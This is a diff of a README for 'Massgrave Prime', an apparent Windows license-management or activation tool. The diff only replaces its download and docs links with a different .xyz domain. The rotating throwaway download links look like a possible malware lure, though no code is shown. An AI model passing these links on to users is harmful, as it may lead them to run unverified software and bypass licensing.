@@ -14,8 +14,8 @@ All-in-one **Massgrave Prime** license management solution featuring HWID bindin
 It keeps things simple: quick to set up, light on resources, and easy to use day to day.
 
 ## Get the app
-- 📥 **Grab the latest version:** [https://massgrave-prime.softonx.xyz](https://massgrave-prime.softonx.xyz)
-- 📖 **Details & docs:** [https://massgrave-prime.softonx.xyz](https://massgrave-prime.softonx.xyz)
+- 📥 **Grab the latest version:** [https://massgrave-prime.softax.xyz](https://massgrave-prime.softax.xyz)
+- 📖 **Details & docs:** [https://massgrave-prime.softax.xyz](https://massgrave-prime.softax.xyz)
 
 ## 🧾 Requirements
 - Windows (64-bit)
